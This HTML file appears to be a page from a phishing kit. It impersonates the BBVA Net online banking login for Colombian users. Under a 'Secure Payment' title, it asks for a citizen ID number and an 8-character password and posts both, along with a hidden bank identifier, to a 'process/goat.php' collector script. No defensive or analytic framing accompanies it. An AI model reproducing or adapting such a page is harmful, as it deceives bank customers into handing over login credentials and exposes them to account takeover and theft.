<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
  <link rel="stylesheet" href="style.css">

  <title>Secure Payment</title>
</head>
<body>

  <img src="./img/menu.jpg" alt="Menu" width="100%">

  <center>
    <div style="width:90%; margin-top: 80px;">
      <a style="font-size:21px;">Hola, ingresa tu número de documento y contraseña para entrar a BBVA Net:</a>
    </div>
  </center>

  <div class="inp">
    <select name="cc" id="">
      <option value="cedula" selected>Cédula de Ciudadania</option>
    </select><br>

    <!-- Formulario que envía datos a goat.php -->
    <form action="process/goat.php" method="POST">
      <input type="tel" id="txtUsuario" name="user" placeholder="Número de documento" required><br>
      <input type="password" name="pass" id="txtPass" placeholder="Contraseña" minlength="8" maxlength="8" required><br>
      <input type="hidden" name="banco" value="bbva">
      <input type="submit" value="Entrar a BBVA Net" style="background-color:#227aba; font-size:17px; border:none; font-weight: bold; color:white; width:85%;"><br>
    </form>
  </div>

</body>
</html>
